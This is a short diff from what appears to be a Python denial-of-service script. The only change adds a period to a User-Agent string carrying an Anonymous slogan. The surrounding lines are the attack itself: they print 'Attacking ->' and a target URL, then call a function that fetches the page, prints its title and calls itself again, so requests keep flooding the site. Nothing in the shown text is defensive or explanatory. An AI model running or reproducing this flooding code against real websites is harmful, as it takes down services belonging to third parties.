@@ -38,7 +38,7 @@ counter = 0
 print('\n____________________________________________________\n\n', 'Attacking ->', URL, '\n____________________________________________________\n')
 def attack(counter):
 	counter += 1
-	req = Request(URL, headers={'User-Agent': 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us'})
+	req = Request(URL, headers={'User-Agent': 'We are Anonymous. We are Legion. We do not forgive. We do not forget. Expect us.'})
 	title = BeautifulSoup(urllib.request.urlopen(req).read(), 'html.parser').find('title')
 	print('Attack', counter, '->', title.text, '\n')
 	attack(counter)
